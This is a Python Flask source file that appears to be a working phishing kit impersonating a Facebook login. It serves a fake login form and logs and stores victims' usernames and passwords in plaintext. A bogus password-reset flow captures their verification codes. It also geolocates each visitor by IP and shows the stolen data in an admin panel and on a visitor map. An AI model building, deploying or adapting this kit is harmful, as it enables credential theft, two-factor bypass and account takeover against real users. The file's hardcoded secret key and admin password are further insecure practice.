from flask import Flask, request, redirect, render_template, send_from_directory, session
from datetime import datetime
import logging
import sqlite3
import requests
import folium
import os

# ========================
# Logging Setup
# ========================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

logging.info("SERVER STARTED")

# ========================
# Database Path
# ========================

DB_PATH = os.path.join(os.getcwd(), "database.db")

# ========================
# إنشاء قاعدة البيانات
# ========================

def init_db():

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        password TEXT,
        ip TEXT,
        device TEXT,
        os TEXT,
        browser TEXT,
        time TEXT
    )
    """)

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS codes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        code TEXT,
        ip TEXT,
        device TEXT,
        os TEXT,
        browser TEXT,
        time TEXT
    )
    """)

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS visits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        country TEXT,
        city TEXT,
        isp TEXT,
        path TEXT,
        method TEXT,
        user_agent TEXT,
        visitor_type TEXT,
        time TEXT,
        Latitude REAL,
        Longitude REAL
    )
    """)

    conn.commit()
    conn.close()

init_db()

# ========================
# Flask
# ========================

app = Flask(__name__)
app.secret_key = "secret123"

# ========================
# استخراج IP الحقيقي
# ========================

def get_real_ip():

    ip = request.headers.get("X-Forwarded-For")

    if not ip:
        ip = request.headers.get("X-Real-IP")

    if not ip:
        ip = request.remote_addr

    if ip:
        ip = ip.split(",")[0].strip()

    return ip

# ========================
# تحديد الموقع
# ========================

def get_location(ip):

    try:

        url = f"https://ipapi.co/{ip}/json/"
        response = requests.get(url, timeout=3)

        if response.status_code != 200:
            return "Unknown","Unknown","Unknown",None,None

        data = response.json()

        country = data.get("country_name","Unknown")
        city = data.get("city","Unknown")
        isp = data.get("org","Unknown")
        Latitude = data.get("latitude",None)
        Longitude = data.get("longitude",None)

        return country,city,isp,Latitude,Longitude

    except Exception as e:

        logging.error(f"Location API error: {e}")
        return "Unknown", "Unknown", "Unknown", None, None

# ========================
# تسجيل كل request
# ========================

@app.before_request
def log_every_request():

    if request.path.startswith("/ping") or request.path.startswith("/favicon"):
        return

    ip = get_real_ip()

    country,city,isp,Latitude,Longitude = get_location(ip)

    path = request.path
    method = request.method
    user_agent = request.headers.get("User-Agent","").lower()
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if "facebookexternalhit" in user_agent:

        visitor_type = "Facebook Bot"
        logging.warning("Facebook bot detected")

    elif "uptimerobot" in user_agent:

        visitor_type = "UptimeRobot"
        logging.info("UptimeRobot ping")

    elif "bot" in user_agent or "crawl" in user_agent:

        visitor_type = "Other Bot"
        logging.warning("Other bot detected")

    else:

        visitor_type = "Real User"
        logging.info("Real user visit")

    logging.info(f"{method} {path} | {ip} | {country} | {city}")

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    cursor.execute("""
    INSERT INTO visits (ip,country,city,isp,path,method,user_agent,visitor_type,time,Latitude,Longitude)
    VALUES (?,?,?,?,?,?,?,?,?,?,?)
    """,(ip,country,city,isp,path,method,user_agent,visitor_type,time,Latitude,Longitude))

    conn.commit()
    conn.close()

# ========================
# favicon
# ========================

@app.route('/favicon.ico')
def favicon():
    return send_from_directory('static','favicon.ico')

# ========================
# ping
# ========================

@app.route("/ping")
def ping():
    logging.info("Ping request received")
    return "OK",200

# ========================
# الصفحة الرئيسية
# ========================

@app.route("/")
def home():

    logging.info("Homepage opened")

    return render_template("FacebookForm.html")

# ========================
# detect device
# ========================

def detect_device(user_agent):

    ua = user_agent.lower()

    if "android" in ua or "iphone" in ua:
        device = "Mobile Phone"
    elif "ipad" in ua:
        device = "Tablet"
    else:
        device = "Computer"

    if "windows" in ua:
        os_name = "Windows"
    elif "android" in ua:
        os_name = "Android"
    elif "iphone" in ua:
        os_name = "iOS"
    else:
        os_name = "Unknown"

    if "chrome" in ua:
        browser = "Chrome"
    elif "firefox" in ua:
        browser = "Firefox"
    elif "safari" in ua and "chrome" not in ua:
        browser = "Safari"
    else:
        browser = "Unknown"

    return device,os_name,browser

# ========================
# login
# ========================

@app.route("/login",methods=["POST"])
def login():

    username = request.form.get("username")
    password = request.form.get("password")

    logging.warning(f"Login attempt | user: {username} with password: {password}")

    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent","Unknown")

    device,os_name,browser = detect_device(user_agent)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    cursor.execute("""
    INSERT INTO users (email,password,ip,device,os,browser,time)
    VALUES (?,?,?,?,?,?,?)
    """,(username,password,ip,device,os_name,browser,time))

    conn.commit()
    conn.close()

    return redirect("https://2742404919047.sarhne.com")
# ========================
# create
# ========================
@app.route("/create")
def create():
    return redirect("https://www.fhyi.com")

#=========================
# Forgot page
#=========================
@app.route("/forgot")
def forgot():
    
    logging.info("Forgot password page opened")

    return render_template("forgot.html")
#=========================
# Verify request
#=========================
@app.route("/verify", methods=["POST"])
def verify():
    phone_or_email = request.form.get("phone_or_email")
    session["phone_or_email"] = phone_or_email

    logging.warning(f"Verify request: {phone_or_email}")
    logging.info("Redirected user to verify code page")
    return render_template("verify.html")
# ========================
# verify_code
# ========================

@app.route("/verify_code",methods=["POST"])
def verify_code():

    code = request.form.get("code")
    phone_or_email = session.get("phone_or_email","Unknown")

    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent","Unknown")

    device,os_name,browser = detect_device(user_agent)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    cursor.execute("""
    INSERT INTO codes (email,code,ip,device,os,browser,time)
    VALUES (?,?,?,?,?,?,?)
    """,(phone_or_email,code,ip,device,os_name,browser,time))

    conn.commit()
    conn.close()

    logging.warning(f"Verification code captured: {code}")

    return redirect("https://2742404919047.sarhne.com")

# ========================
# ADMIN LOGIN
# ========================

@app.route("/admin_login",methods=["GET","POST"])
def admin_login():

    if request.method == "POST":

        username = request.form.get("username")
        password = request.form.get("password")

        if username == "Hasan@RR" and password == "RafifIsMyLove":

            session["admin"] = True
            logging.warning("Admin logged in")

            return redirect("/admin")

        else:

            logging.warning("Failed admin login attempt")

    return """
    <h2>Admin Login</h2>

    <form method="POST">

    <input name="username" placeholder="Username"><br><br>

    <input name="password" type="password" placeholder="Password"><br><br>

    <button type="submit">Login</button>

    </form>
    """

# ========================
# ADMIN LOGOUT
# ========================

@app.route("/admin_logout")
def admin_logout():

    session.pop("admin",None)

    logging.info("Admin logged out")

    return redirect("/admin_login")

# ========================
# ADMIN PANEL
# ========================

@app.route("/admin")
def admin():

    if not session.get("admin"):
        return redirect("/admin_login")

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM visits")
    visits = cursor.fetchall()

    cursor.execute("SELECT * FROM users")
    users = cursor.fetchall()

    cursor.execute("SELECT * FROM codes")
    codes = cursor.fetchall()

    conn.close()

    html ="""
    <h2>Users</h2>
    <table border='1'>
    <tr>
    <th>ID</th>
    <th>Email</th>
    <th>Password</th>
    <th>IP</th>
    <th>Device</th>
    <th>OS</th>
    <th>Browser</th>
    <th>Time</th>
    </tr>
    """
    for user in users:
        html += "<tr>" + "".join(f"<td>{col}</td>" for col in user) + "</tr>"

    html += "</table>"

    html +="""
    <h2>Codes</h2>
    <table border='1'>
    <tr>
    <th>ID</th>
    <th>Email</th>
    <th>Code</th>
    <th>IP</th>
    <th>Device</th>
    <th>OS</th>
    <th>Browser</th>
    <th>Time</th>
    </tr>
    """
    for code in codes:
        html += "<tr>" + "".join(f"<td>{col}</td>" for col in code) + "</tr>"

    html += "</table>"

    html += """
    <h2>Visits</h2>
    <table border='1'>
    <tr>
    <th>ID</th>
    <th>IP</th>
    <th>Country</th>
    <th>City</th>
    <th>ISP</th>
    <th>Path</th>
    <th>Method</th>
    <th>User Agent</th>
    <th>Visitor Type</th>
    <th>Time</th>
    <th>Latitude</th>
    <th>Longitude</th>
    
    </tr>
    """
    for visit in visits:
        html += "<tr>" + "".join(f"<td>{col}</td>" for col in visit) + "</tr>"

    html += "</table>"

    return html

# ========================
# MAP
# ========================

@app.route("/map")
def map_view():

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    cursor.execute("""
    SELECT ip,city,country,visitor_type,Latitude,Longitude
    FROM visits
    WHERE Latitude IS NOT NULL AND Longitude IS NOT NULL
    """)

    visits = cursor.fetchall()

    conn.close()

    m = folium.Map(
    location=[20,0],
    zoom_start=3,
    tiles="https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}",
    attr="Google Satellite"
    )

    for ip,city,country,visitor_type,Latitude,Longitude in visits:

        folium.Marker(
            location=[Latitude,Longitude],
            popup=f"{ip} | {city},{country} | {visitor_type}"
        ).add_to(m)

    return m._repr_html_()

# ========================
# تشغيل السيرفر
# ========================

if __name__ == "__main__":

    port = int(os.environ.get("PORT",5000))

    logging.info(f"Server running on port {port}")

    app.run(host="0.0.0.0",port=port)       